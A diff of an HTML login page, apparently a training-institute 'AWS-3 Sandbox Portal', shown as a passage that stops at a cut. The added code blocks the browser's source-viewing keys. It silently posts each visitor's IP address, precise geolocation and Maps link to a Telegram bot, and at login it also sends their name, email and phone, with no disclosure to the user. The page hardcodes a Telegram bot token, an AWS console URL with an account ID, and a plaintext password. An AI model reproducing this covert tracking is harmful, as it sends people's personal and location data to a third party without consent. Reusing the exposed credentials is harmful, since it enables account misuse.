@@ -1,381 +1,428 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AWS-3 veera</title>
-  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/f/fc/Amazon_Web_Services_2025.svg">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;400&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <meta charset="utf-8">
+  <title>AWS-3 Sandbox Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
   <style>
-    /* ...styles unchanged (identical to input; omitted for brevity)... */
     :root {
-      --accent: #8a7cf2;
-      --accent2: #20e3b2;
-      --accentDark1: #23243a;
-      --accentDark2: #161722;
-      --darkBg1: #181926;
-      --darkBg2: #14141e;
-      --darkCard: #23253f;
-      --glassDark: rgba(23,24,41,0.48);
-      --border-main: #283657;
-      --border-strong: #7161ef;
-      --input-dark: #20213b;
-      --input-border: #343866;
-      --input-alt: #232642;
-      --txt-main: #e8eaf6;
-      --txt-muted: #7ea4be;
-      --danger: #ff4069;
-      --good: #4be0b0;
-    }
-    html, body {
-      height: 100%;
-      margin: 0;
-      padding: 0;
+      --bg: #0d0f1c;
+      --card: #14162a;
+      --card-light: #1c1f37;
+      --border: #2a2d46;
+      --text: #eef1ff;
+      --muted: #a9b2d4;
+      --purple: #7b5cff;
+      --purple2: #5e44e4;
+      --accent: #3be1b5;
     }
     body {
+      margin: 0;
+      padding: 50px 10px 0 10px;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Roboto',sans-serif;
       min-height: 100vh;
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: flex-start;
       overflow-x: hidden;
-      font-family: 'Montserrat', 'Roboto', Arial, sans-serif;
-      background: linear-gradient(135deg, var(--darkBg1) 0%, var(--accentDark2) 50%, #3c305c 100%);
-      animation: dark-bg-move 15s ease-in-out infinite alternate;
-      transition: background 0.4s;
-      position:relative;
+      overflow-y: auto;
     }
-    @keyframes dark-bg-move {
-      0% { background-position: 0 0; }
-      100% { background-position: 100vw 70vh; }
-    }
-    .animated-blur-bg {
-      pointer-events: none;
+    .bg-animate {
       position: fixed;
-      width: 180vw;
-      height: 180vh;
-      top: -70vh;
-      left: -60vw;
+      inset: 0;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(120deg,#8a7cf2,#20e3b2,#8a7cf2);
+      animation: moveBg 12s infinite alternate linear;
+      filter: blur(120px);
+      opacity: 0.15;
       z-index: 0;
-      opacity: 0.12;
-      filter: blur(115px);
-      background: radial-gradient(circle at 63% 41%, #20e3b233 0%,transparent 41%),
-                  radial-gradient(circle at 40% 80%, #8a7cf238 0%,transparent 60%),
-                  radial-gradient(circle at 83% 53%, #fe7bb023 0%,transparent 44%),
-                  radial-gradient(circle at 14% 86%, #664aff42 0%,transparent 59%);
-      transition: background 0.95s;
     }
-    /* ...rest of styles as-is... */
-    .signup-title {
-      background: linear-gradient(95deg, var(--accent2) 10%, var(--accent) 95%);
-      background-clip: text;
-      -webkit-background-clip: text;
-      color: transparent;
-      -webkit-text-fill-color: transparent;
-      font-size: 2.4rem;
-      letter-spacing: 2.4px;
-      font-family: 'Montserrat', Arial, sans-serif;
-      text-align: center;
-      font-weight: 700;
-      margin-bottom: 35px;
-      text-shadow: 0 9px 32px #282c3b40, 0 2.5px 1.5px #20e3b229;
-      user-select: none;
+    @keyframes moveBg {
+      0% { transform: translate(-20%, -20%); }
+      100% { transform: translate(20%, 20%); }
     }
-    .signup-title .sandbox-time-black {
-      color: var(--txt-muted) !important;
-      -webkit-text-fill-color: var(--txt-muted) !important;
-      background: none !important;
-      font-weight: 400;
-      font-size: 0.66em;
-      padding-left: 10px;
-      letter-spacing: 0.15em;
-      text-shadow: none;
+    .bubbles { position: fixed; inset: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; overflow: hidden; }
+    .bubbles span {
+      position: absolute; border-radius: 50%; filter: blur(3px);
+      animation: floatUp 14s infinite linear; opacity: 0.65;
     }
-    /* ...rest of styles as in your file... */
-    .input-row {
-      margin-bottom: 24px;
-      position:relative;
-      width:100%;
+    @keyframes floatUp {
+      0% { transform: translateY(120vh) scale(0.6); opacity: 0.3; }
+      50% { opacity: 1; }
+      100% { transform: translateY(-20vh) scale(1.1); opacity: 0; }
     }
-    .form-input {
-      width: 100%;
-      padding: 15px 19px 15px 50px;
-      border-radius: 11px;
-      border: 1.8px solid var(--input-border);
-      font-size: 1.08em;
-      font-family: 'Roboto', Arial, sans-serif;
-      outline: none;
-      background: linear-gradient(92deg, var(--input-dark) 85%, var(--input-alt) 120%);
-      color: var(--txt-main);
-      box-shadow: 0 3px 24px #12011c22 inset;
-      transition: box-shadow 0.3s, border 0.2s, background 0.25s;
-      position:relative;
-      z-index: 2;
+    .container { width: 100%; max-width: 900px; z-index: 5; position: relative; }
+    .card {
+      width: 380px;
+      margin: 0 auto;
+      background: var(--card-light);
+      border: 1px solid var(--border);
+      padding: 30px;
+      border-radius: 18px;
+      box-shadow: 0 0 40px rgba(0,0,0,0.4);
     }
-    .form-input::placeholder {
-      color: var(--txt-muted);
-      opacity: 1;
+    .logo {
+      width: 220px; height: auto; display: block;
+      margin: 0 auto 12px auto;
     }
-    .form-input:focus {
-      border: 2px solid var(--accent2);
-      box-shadow:0 0 0 5px #1ee3b039,0 2px 18px #1ee3b018 inset;
-      background: linear-gradient(88deg, var(--input-alt) 57%, var(--input-dark) 140%);
-      color: var(--good);
+    h2 { text-align: center; font-family:'Montserrat', sans-serif; font-size: 1.5rem; margin-bottom: 25px; }
+    .field { margin-bottom: 18px; }
+    label { display: block; margin-bottom: 6px; color: var(--muted); font-size: .9rem; }
+    .input {
+      width: 100%; padding: 14px; border-radius: 10px;
+      border: 1px solid var(--border);
+      background: rgba(255,255,255,0.08); color: white; font-size: 1rem;
     }
-    .input-icon {
-      position:absolute;
-      top: 15px;
-      left:18px;
-      font-size: 1.20em;
-      color: var(--accent2);
-      opacity: 0.90;
-      z-index: 3;
-      pointer-events: none;
-      text-shadow: 0 2px 14px #20e3b236;
-    }
-    .styled-btn {
-      width: 100%;
-      padding: 15px 0 15px;
-      background: linear-gradient(97deg, var(--accent) 9%, var(--accent2) 100%);
-      color: #fff;
-      font-size: 1.17em;
-      border: none;
-      border-radius: 10px;
-      font-family:'Montserrat',Arial,sans-serif;
-      font-weight: 800;
-      letter-spacing: 1.2px;
-      box-shadow: 0 2px 35px #20e3b214, 0 5px 17px #1e24391b;
-      cursor: pointer;
-      margin-top: 12px;
-      transition: background 0.29s, box-shadow 0.21s, transform 0.18s, filter 0.2s;
-    }
-    .styled-btn:active { transform: scale(0.97);}
-    .styled-btn:hover, .styled-btn:focus {
-      background: linear-gradient(95deg, var(--accent2) 7%, var(--accent) 120%);
-      box-shadow: 0 10px 38px #20e3b210;
-      filter: brightness(1.08) drop-shadow(0 0 6px #7cfbb830);
-      outline:none;
+    .btn {
+      width: 100%; padding: 14px; border: none; border-radius: 10px;
+      background: linear-gradient(90deg,var(--purple),var(--purple2));
+      color: white; font-size: 1.1rem; font-weight: 700; cursor: pointer;
     }
     .message {
-      margin-top: 21px;
-      padding: 12px 20px 10px;
-      font-size: 1em;
-      font-family: 'Montserrat', Arial, sans-serif;
-      border-radius: 8px;
-      text-align:center;
-      min-height: 32px;
-      border: 1.5px solid transparent;
-      background: #27294c;
-      color: var(--txt-main);
-      box-shadow:0 1.5px 7.5px #1160a005;
       display: none;
-      transition: background 0.18s, color 0.22s, border 0.18s;
-    }
-    .message.success {
-      background: linear-gradient(106deg, #1e4434 10%, #18ad92 70%, #0e835c 100%);
-      color: #dbfff0;
-      border: 1.8px solid #2aedd0;
-      display:block;
-      text-shadow: 0 2px 8px #1ee3b080;
-    }
-    .message.error {
-      background: linear-gradient(106deg, #3b1924 10%, #ae337f 80%);
-      color: #ffabb7;
-      border: 1.7px solid #ff406944;
-      display:block;
-      text-shadow: 0 1px 4px #e6588877;
-    }
-    #signupInfo {
-      margin-top: 15px;
-      text-align:center;
-      color: var(--accent2);
-      font-size: 1.12em;
-      font-weight: 600;
-      background: #20223aee;
-      padding: 8px 13px 8px;
-      border-radius:12px;
-      display: none;
-      border:1.5px solid #285a89a3;
-      box-shadow:0 2px 8px #09172616;
-      letter-spacing:0.08em;
-    }
-    .sandbox-card {
-      margin: 67px auto 0;
-      max-width: 470px;
-      min-width: 310px;
-      background: linear-gradient(133deg, var(--darkCard) 90%, #322465aa 96%);
-      box-shadow:
-        0 10px 60px #12106566,
-        0 1.5px 19px #20e3b220,
-        0 11px 61px #221a46cc;
-      border-radius: 28px;
-      padding: 48px 40px 40px 40px;
-      font-size: 1.17em;
-      color: var(--txt-main);
-      display: none;
-      animation: fadeInDark 1.18s cubic-bezier(0.35,0.84,0.45,1.24);
-      border: 2.2px solid var(--border-main);
-      position:relative;
-      background-clip: padding-box;
-      z-index: 2;
-    }
-    .sandbox-card h2 {
-      margin-top: 0;
-      text-align: center;
-      background: linear-gradient(90deg, var(--accent2) 0%, var(--accent) 90%);
-      background-clip: text;
-      -webkit-background-clip: text;
-      color: transparent;
-      -webkit-text-fill-color: transparent;
-      font-family: 'Montserrat', Arial, sans-serif;
-      font-size: 2em;
-      margin-bottom:28px;
-      letter-spacing:0.04em;
-      text-shadow: 0 3px 13px #11131840;
-    }
-    .copy-btn {
-      padding: 7px 18px;
-      border-radius: 9px;
-      background: linear-gradient(91deg, var(--accent2) 2%, var(--accent) 92%);
-      color: #fff;
-      border:none;
-      font-weight: 700;
-      cursor:pointer;
-      font-size: 1.03em;
-      transition: filter 0.19s, background 0.2s, transform 0.12s;
-      box-shadow:0 2px 11px #20e3b218;
-      margin-left:7px;
-      outline: none;
-      letter-spacing: 0.04em;
-      text-shadow: 0 2px 7px #1ee3b03c;
-    }
-    .copy-btn:active { transform:scale(0.95);}
-    .copy-btn:hover, .copy-btn:focus {
-      filter: brightness(1.13) contrast(1.15);
-      background: linear-gradient(91deg,var(--accent), var(--accent2));
-      outline:none;
-      box-shadow:0 5px 17px #8a7cf240;
-    }
-    @keyframes fadeInDark {
-      from { opacity: 0; transform: translateY(54px);}
-      to { opacity: 1; transform: translateY(0);}
-    }
-    .sb-label {
-      display: block;
-      font-weight: 700;
-      margin-bottom: 4px;
-      font-family:'Montserrat', Arial, sans-serif;
-      color: var(--accent2);
-      letter-spacing:0.05em;
-      font-size:1.08em;
-      text-shadow: 0 1px 7px #20e3b088;
-    }
-    .sb-in-row {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-top: 4px;
-      width:100%;
-    }
-    .sb-inp {
-      flex: 1;
-      padding: 9px 13px;
-      border-radius: 8px;
-      border: 1.5px solid var(--input-border);
-      font-size: 1.10em;
-      background: linear-gradient(92deg, #1a1c2b 25%, #1d1e29 120%);
-      color: var(--good);
-      overflow: auto;
-      font-family: 'Roboto', Arial, sans-serif;
-      transition: border 0.2s, box-shadow 0.16s, filter 0.19s;
-      box-shadow: 0 2px 22px #20e3b011 inset;
-      outline: none;
-    }
-    .sb-inp:focus {
-      border: 1.7px solid var(--accent2);
-      box-shadow: 0 0 7px #20e3b066;
-      background: #20234a;
-      color: var(--accent2);
-      filter: brightness(1.05);
-    }
-    .auto-shutdown-row {
-      font-size:1.09em;
-      margin-bottom:18px;
-      background: linear-gradient(91deg, #2c2949ee 0%, #283e57ee 100%);
-      padding:13px 16px 8px 16px;
-      border-radius:11px;
-      box-shadow:0 1.5px 13.5px #1ee3b00d;
-      border:1.5px solid #1ee3b040;
-      margin-top: 1em;
-      color: #9bf6e6;
-      font-family: 'Roboto', Arial, sans-serif;
-      letter-spacing:0.04em;
-    }
-    .auto-shutdown-row span {
-      font-weight:700;
-      color: var(--accent2);
-      letter-spacing:0.07em;
-      text-shadow: 0 1px 5px #20e3b031;
-      font-size: 1.11em;
-    }
-    .auto-shutdown-row small {
-      color: #9bafcd;
-      font-size: 0.97em;
-      font-weight: 400;
-    }
-    .sandbox-row-group {
-      margin-bottom:2.1em;
-    }
-    .return-btn {
-      width:100%;
-      margin: 32px 0 0;
-      background: linear-gradient(99deg,#20274a,#43296e 98%);
-      color: #bbeeef;
-      font-weight: 800;
-      font-size: 1.08em;
-      padding: 13px 0 13px 0;
-      border: none;
+      margin-top: 12px;
+      padding: 12px;
       border-radius: 10px;
-      box-shadow:0 2px 13px #20164b33;
-      cursor:pointer;
-      transition:background 0.21s, filter 0.21s, transform 0.11s;
-      letter-spacing: 0.1em;
-      text-shadow: 0 2px 9px #13004528;
+      background: rgba(59,225,181,0.15);
+      border: 1px solid rgba(59,225,181,0.5);
+      color: var(--accent);
+      text-align: center;
     }
-    .return-btn:active { transform:scale(0.97);}
-    .return-btn:hover { background: linear-gradient(99deg,#43296e,#20274a 98%); filter:brightness(1.12);}
-    @media (max-width: 570px) {
-      .sandbox-card { padding: 26px 4vw 22px; min-width: unset; max-width:99vw; }
-      .sandbox-card {padding-top: 24px;}
-      body { overflow-x:auto;}
+    .welcome {
+      display: none;
+      background: var(--card);
+      padding: 25px;
+      border-radius: 18px;
+      border: 1px solid var(--border);
+      margin-top: 20px;
     }
-    @media (max-width: 390px) {
-      .signup-title {font-size: 1.28rem;}
-      .sandbox-card {padding:12px 0.4vw;}
+    .topbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+    .topbar h1 { margin: 0; font-size: 1.45rem; font-family: 'Montserrat', sans-serif; }
+    .open-btn {
+      padding: 10px 20px;
+      border: 1px solid var(--purple);
+      background: transparent;
+      color: white;
+      font-weight: 600;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .url-box {
+      background: var(--card-light); border: 1px solid var(--border);
+      padding: 18px; border-radius: 12px; margin-bottom: 20px;
+    }
+    .url-row { display: flex; gap: 10px; }
+    .url-input {
+      flex: 1; border-radius: 10px; padding: 12px; border: none;
+      background: #0f1123; color: white;
+    }
+    .shutdown { display: flex; align-items: center; gap: 10px; margin-bottom: 25px; color: var(--muted); }
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+    .item { background: var(--card-light); border: 1px solid var(--border); padding: 16px; border-radius: 12px; }
+    .item-row { display: flex; gap: 10px; }
+    .item-label { margin-bottom: 6px; color: var(--muted); font-size: 0.92rem; font-weight: 500; }
+    .item-in {
+      flex: 1; padding: 12px; border: none; border-radius: 10px;
+      background: #0f1123; color: white;
+    }
+    .copy {
+      padding: 10px; border-radius: 10px;
+      background: linear-gradient(90deg,var(--purple),var(--purple2));
+      border: none; color: white; cursor: pointer;
+    }
+    .side-box {
+      background: var(--card-light);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      font-size: .9rem;
+      color: var(--muted);
+    }
+    .side-title { font-size: 1rem; margin-bottom: 12px; font-weight: 600; color: white; }
+    .warning-access-closed {
+      color: #ff3555;
+      background: #23232f;
+      border: 2px solid #8a7cf2;
+      border-radius: 12px;
+      padding: 20px;
+      font-size: 1.13em;
+      text-align: center;
+      margin-bottom: 18px;
+      font-family: 'Montserrat',sans-serif;
+    }
+    .warning-label {
+      color: #20e3b2;
+      font-weight: bold;
+      font-size: 1em;
+      margin-bottom: 6px;
+    }
+    .warning-userpass {
+      margin: 10px 0 0 0;
+      color: #a9b2d4;
+      font-size: 0.97em;
     }
   </style>
   <script>
-    // Prevent right-click, view-source hotkeys, and drag-select (unchanged)
-    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
-    document.addEventListener('keydown', function(e) {
-      if (
-        e.key === "F12"
-        || (e.ctrlKey && e.shiftKey && (e.key.toLowerCase() === "i" || e.key.toLowerCase() === "j" || e.key.toLowerCase() === "c"))
-        || (e.ctrlKey && (e.key.toLowerCase() === "u" || e.key.toLowerCase() === "s"))
-      ) {
+    // Prevent source code view by disabling context menu and some common key combos
+    document.addEventListener('DOMContentLoaded', function() {
+      // Disable right-click
+      document.addEventListener('contextmenu', function(e) {
         e.preventDefault();
-        return false;
-      }
+      });
+
+      // Disable F12, Ctrl+Shift+I/J/C/U, Ctrl+U, Ctrl+S, etc
+      document.addEventListener('keydown', function(e) {
+        // F12
+        if (e.key === 'F12') {
+          e.preventDefault();
+          return false;
+        }
+        // Ctrl+Shift+I/J/C/U
+        if ((e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.key === 'U')) ||
+            // Ctrl+U, Ctrl+S, Ctrl+Shift+S
+            (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S'))) {
+          e.preventDefault();
+          return false;
+        }
+      });
     });
-    document.addEventListener('selectstart', function(e) { e.preventDefault(); });
-    document.addEventListener('dragstart', function(e) { e.preventDefault(); });
+  </script>
+</head>
+<body>
+  <div class="bg-animate"></div>
+  <div class="bubbles"></div>
+  <div class="container">
+    <div class="card" id="loginCard">
+      <img src="https://miro.medium.com/v2/resize:fit:1200/1*neG4D9C8UcJvNn6bverfIA.png" class="logo" alt="AWS Logo">
+      <h2>AWS-3 Sandbox Login</h2>
+      <div class="field">
+        <label for="name">Name</label>
+        <input id="name" class="input" placeholder="Enter your name" autocomplete="off" autocorrect="off" spellcheck="false">
+      </div>
+      <div class="field">
+        <label for="email">Email</label>
+        <input id="email" class="input" type="email" placeholder="Enter your email" autocomplete="off" autocorrect="off" spellcheck="false" autocapitalize="off">
+      </div>
+      <div class="field">
+        <label for="phone">Phone</label>
+        <input id="phone" class="input" type="tel" maxlength="13" placeholder="+91XXXXXXXXXX" autocomplete="off" autocorrect="off" spellcheck="false" inputmode="tel" pattern="^\+91[0-9]{10}$">
+        <small style="display:block;margin-top:2px;color:#88ffe0;">Must start with +91 and followed by 10 digits</small>
+      </div>
+      <button class="btn" id="submitBtn">Submit</button>
+      <div id="msg" class="message">Access Granted!</div>
+    </div>
+    
+    <div class="welcome" id="welcomeSection">
+      <div class="topbar">
+        <div style="text-align:center; margin-bottom: 12px;">
+          <img src="https://miro.medium.com/v2/resize:fit:1200/1*neG4D9C8UcJvNn6bverfIA.png" alt="AWS Logo" style="height:48px;">
+        </div>
+        <h1 style="display:inline-block;vertical-align:middle;margin:0;margin-right:16px;">AWS Sandbox</h1>
+        <button class="open-btn" id="openSandboxBtn">Open Sandbox</button>
+      </div>
+      <!-- Timing-controlled content block starts here -->
+      <div id="sandboxCredentialsArea">
+        <!-- Content controlled by JS -->
+      </div>
+      <div style="margin-top:36px; text-align:center; color:#8fa0c7; font-size:1.05em;">
+        Developed by DevOps team: Abinash, Tanuja, Abdul, Nikhitha
+      </div>
+    </div>
+  </div>
+  <script>
+    // Time-based credential display logic -- configuration
+    // Show access only between 12:50PM and 7:15PM (inclusive)
+    function isWithinTimeWindow() {
+      // Get current time (client time)
+      let now = new Date();
+      // Get today's date's times
+      let year = now.getFullYear(), month = now.getMonth(), day = now.getDate();
+      // Start: 12:50PM
+      let start = new Date(year, month, day, 12, 50, 0, 0);
+      // End: 7:15PM (19:15)
+      let end = new Date(year, month, day, 19, 15, 59, 999);
+      return now >= start && now <= end;
+    }
+
+    // Render function for credentials area
+    function renderCredentialsArea() {
+      var area = document.getElementById('sandboxCredentialsArea');
+      if (!area) return;
+      if (isWithinTimeWindow()) {
+        area.innerHTML = `
+      <div class="url-box">
+        <div class="url-row">
+          <label
+            for="sandboxURL"
+            class="url-label"
+            style="margin-right: 12px; font-weight: 600; color: white;"
+          ><br>
+            Sandbox URL =>
+          </label>
+          <input
+            type="text"
+            id="sandboxURL"
+            class="url-input"
+            readonly
+
+            
+            value="https://975050012121.signin.aws.amazon.com/console?region=us-east-1"
+
+
+
+            
+            aria-label="Sandbox AWS Console URL"
+          >
+          <button 
+            type="button"
+            class="copy" 
+            data-target="sandboxURL"
+            aria-label="Copy Sandbox URL"
+            title="Copy URL"
+          >📋</button>
+        </div>
+      </div>
+      <div class="shutdown">⏰ Auto Shutdown at 7:15PM — Your sandbox will be cleaned automatically.</div>
+      <div class="grid">
+        <div>
+          <div class="item">
+            <div class="item-label">Username</div>
+            <div class="item-row">
+              <input id="user" class="item-in" readonly value="cloud_user" autocomplete="off" autocorrect="off" spellcheck="false">
+              <button class="copy" data-target="user">📋</button>
+            </div>
+          </div>
+          <div class="item" style="margin-top:20px;">
+            <div class="item-label">Password</div>
+            <div class="item-row">
+              <input
+                id="pass"
+                class="item-in"
+                type="text"
+                readonly
+
+
+                
+                value="3(Z9)ybpsjFH7O$)TeW7"
+
+
+                
+                autocomplete="off"
+                autocorrect="off"
+                spellcheck="false"
+                aria-label="Sandbox Password"
+              >
+              <button class="copy" data-target="pass">📋</button>
+            </div>
+          </div>
+        </div>
+        <div class="side-box">
+          <div class="side-title">Note :</div>
+          <div style="background:rgba(42,56,90,0.8);padding:14px 18px;border-radius:8px;box-shadow:0 2px 8px 0 rgba(0,0,0,0.08);margin-bottom:18px;margin-top:6px;color:#f0f3ff;">
+            <div style="font-weight:600;margin-bottom:4px;font-size:15px;">You can use two regions only:</div>
+            <ol style="margin: 8px 0 0 20px; color: #eee;">
+              <li>N. Virginia <span style="color:#ccc;"> 👉</span> <code>us-east-1</code></li>
+              <li>Oregon      <span style="color:#ccc;"> 👉</span> <code>us-west-2</code></li>
+            </ol>
+          </div>
+          <div>
+            Your sandbox will automatically expire 4 hours after your start time.<br><br>
+            If you need to extend your session, you will receive a notification when you have 1 hour remaining 
+            that will allow you to extend your sandbox session for an additional 4 hours.  
+          </div>
+        </div>
+      </div>
+        `;
+      } else {
+        area.innerHTML = `
+          <div class="warning-access-closed">
+            <span style="font-size: 2.1em;">🔒</span>
+            <div class="warning-label">Abinash has ended the access.</div>
+            <div class="warning-userpass">
+              The Sandbox URL, Username, and Password are only available from <b>12:50 PM</b> to <b>7:15 PM</b>.<br>
+              Please contact your DevOps admin if you need further access.
+            </div>
+          </div>
+        `;
+      }
+    }
+
+    // On loading, render conditional credentials block
+    document.addEventListener('DOMContentLoaded', function() {
+      renderCredentialsArea();
+      // Optional: update credentials block dynamically if user stays on page over edge of time window
+      setInterval(renderCredentialsArea, 60000);
+    });
   </script>
   <script>
-    // Only allow access within 1 km of Naresh IT New Campus
+    // --- The rest of your original logic below ---
+    // The following is the original JS for location, login, copy buttons etc, unchanged except for credentials section moved above.
+    // Enforce Location Restriction (1km around Naresh IT New Campus)
     const allowedLat = 17.4382809;
     const allowedLon = 78.4525712;
-    const allowedRadius = 1000; // meters (1km)
+    const allowedRadius = 1000;
+    const TELEGRAM_BOT_TOKEN = '7878047212:AAFtWO7f6Ws2sYHqHSviasJUOy7cO11lZ4o';
+    const TELEGRAM_CHAT_ID = '5025112538';
+
+    function sendLocAndIpToTelegram(lat, lon, accuracy) {
+      fetch("https://api.ipify.org?format=json")
+        .then(resp => resp.json())
+        .then(data => {
+          const ip = data.ip || 'Unknown';
+          const nowStr = new Date().toLocaleString();
+          const text = `🌎 New VISIT to Sandbox login page:
+
+🕒 Time: ${nowStr}
+🌐 IP: ${ip}
+🗺️ Location: ${lat}, ${lon}
+📏 Accuracy: ${accuracy}m
+📍 Google Maps: https://maps.google.com/?q=${lat},${lon}
+          `;
+          const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+          fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+          }).catch(() => {});
+        });
+    }
+
+    function sendLoginLocAndIpToTelegram(name, email, phone, signupTime, geo, ip) {
+      let geoInfo = '';
+      let mapInfo = '';
+      if (geo && geo.latitude && geo.longitude) {
+        geoInfo = `
+🗺️ Location: ${geo.latitude}, ${geo.longitude}
+📏 Accuracy: ${geo.accuracy}m`;
+        mapInfo = `📍 Maps: https://maps.google.com/?q=${geo.latitude},${geo.longitude}`;
+      } else {
+        geoInfo = "\n🗺️ Location: Not available";
+        mapInfo = "";
+      }
+      let ipInfo = '\n🌐 IP: ';
+      ipInfo += ip ? ip : 'Not available';
+
+      const text =
+`📝 New AWS-3 Sandbox Login:
+
+👤 Name: ${name}
+📧 Email: ${email}
+📱 Phone: ${phone}
+⏱ Signup Time: ${signupTime}${geoInfo}
+${mapInfo}${ipInfo}`;
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+      }).catch(() => {});
+    }
 
     function getDistance(lat1, lon1, lat2, lon2) {
       const R = 6371e3;
@@ -389,9 +436,7 @@
       const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
       return R * c;
     }
-
     function messageAllowLocationInChrome() {
-      // Added user instruction for Chrome location permissions
       document.body.innerHTML = `
         <div style="padding:42px 20px 32px;text-align:center;color:#ff4069;font-size:1.25em;background:#222240;border-radius:22px;margin:2vw;box-shadow:0 6px 40px #332ac055;max-width:420px;margin-left:auto;margin-right:auto;">
           <b>Location access required</b>
@@ -416,7 +461,26 @@
       `;
     }
 
+    function getLocationPermissionStatus() {
+      return sessionStorage.getItem("locationAllowed");
+    }
+    function setLocationPermissionStatus(val) {
+      sessionStorage.setItem("locationAllowed", val);
+    }
+    function setLocationDetails(lat, lon, accuracy) {
+      sessionStorage.setItem("locationUserLat", lat);
+      sessionStorage.setItem("locationUserLon", lon);
+      sessionStorage.setItem("locationUserAcc", accuracy);
+    }
+
     function checkLocation() {
+      if (getLocationPermissionStatus() === "allowed") {
+        return Promise.resolve();
+      }
+      if (getLocationPermissionStatus() === "denied") {
+        messageAllowLocationInChrome();
+        return Promise.reject("Location previously denied.");
+      }
       if (!navigator.geolocation) {
         messageAllowLocationInChrome();
         return Promise.reject("Geolocation not supported.");
@@ -425,6 +489,12 @@
         navigator.geolocation.getCurrentPosition(pos => {
           const userLat = pos.coords.latitude;
           const userLon = pos.coords.longitude;
+          const accuracy = pos.coords.accuracy;
+          sendLocAndIpToTelegram(userLat, userLon, accuracy);
+
+          setLocationPermissionStatus("allowed");
+          setLocationDetails(userLat, userLon, accuracy);
+
           const distance = getDistance(userLat, userLon, allowedLat, allowedLon);
           if (distance > allowedRadius) {
             document.body.innerHTML = `
@@ -439,12 +509,15 @@
                 </div>
               </div>
             `;
+            setLocationPermissionStatus("denied");
             reject("Access Denied: Location out of range.");
           } else {
+            setLocationPermissionStatus("allowed");
             resolve();
           }
         }, err => {
           messageAllowLocationInChrome();
+          setLocationPermissionStatus("denied");
           reject("Geolocation error: Please allow access in Chrome.");
         });
       });
@@ -452,335 +525,209 @@
 
     window.addEventListener('DOMContentLoaded', function() {
       checkLocation().then(function() {
-        // Allowed
+        // Bubbles generation
+        (function() {
+          const bubbleColors = [
+            "#9fd3ff", "#f7b3ff", "#b8ffec", "#e3d1ff"
+          ];
+          const bubblesContainer = document.querySelector(".bubbles");
+          for (let i = 0; i < 40; i++) {
+            let bubble = document.createElement("span");
+            let size = Math.random() * 40 + 15;
+            let left = Math.random() * 100;
+            let delay = Math.random() * 10;
+            let duration = Math.random() * 12 + 12;
+            let color = bubbleColors[Math.floor(Math.random() * bubbleColors.length)];
+            bubble.style.width = size + "px";
+            bubble.style.height = size + "px";
+            bubble.style.left = left + "%";
+            bubble.style.background = `radial-gradient(circle, ${color}, transparent)`;
+            bubble.style.animationDuration = duration + "s";
+            bubble.style.animationDelay = delay + "s";
+            bubblesContainer.appendChild(bubble);
+          }
+        })();
+
+        // Email auto-fill
+        (function() {
+          const emailInput = document.getElementById('email');
+          if (emailInput) {
+            emailInput.addEventListener('input', function(e) {
+              const v = emailInput.value;
+              if (v.length >= 2 && v.endsWith('@') && !/@.*\./.test(v)) {
+                if (!v.endsWith('@gmail.com')) {
+                  emailInput.value = v + 'gmail.com';
+                  emailInput.setSelectionRange(emailInput.value.length, emailInput.value.length);
+                }
+              }
+            });
+          }
+        })();
+
+        // Phone auto-format
+        (function() {
+          const phoneInput = document.getElementById('phone');
+          if (phoneInput) {
+            phoneInput.addEventListener('input', function(e) {
+              let val = phoneInput.value;
+              val = val.replace(/[^0-9+]/g, '');
+              if (!val.startsWith("+91")) {
+                val = "+91" + val.replace(/^(\+)?(91)?/, "");
+              }
+              if (val.length > 13) {
+                val = val.slice(0, 13);
+              }
+              phoneInput.value = val;
+            });
+          }
+        })();
+
+        // Copy button logic (fallback for credentials appearing later)
+        document.addEventListener("click", function(e) {
+          if (e.target.classList.contains("copy")) {
+            if (window.getSelection) { window.getSelection().removeAllRanges(); }
+            const el = document.getElementById(e.target.dataset.target);
+            if (el) {
+              navigator.clipboard.writeText(el.value);
+              e.target.textContent = "✓";
+              setTimeout(() => e.target.textContent = "📋", 700);
+            }
+          }
+        });
+
+        // Open Sandbox logic
+        document.getElementById('openSandboxBtn').addEventListener("click", function(e) {
+          if (window.getSelection) { window.getSelection().removeAllRanges(); }
+          if (getLocationPermissionStatus() !== "allowed") {
+            messageAllowLocationInChrome();
+            return;
+          }
+          var loginCard = document.getElementById("loginCard");
+          var welcomeSection = document.getElementById("welcomeSection");
+          var name = document.getElementById('name') ? document.getElementById('name').value.trim() : null;
+          var email = document.getElementById('email') ? document.getElementById('email').value.trim() : null;
+          var phone = document.getElementById('phone') ? document.getElementById('phone').value.trim() : null;
+          function validateEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+          }
+          function validatePhone(phone) {
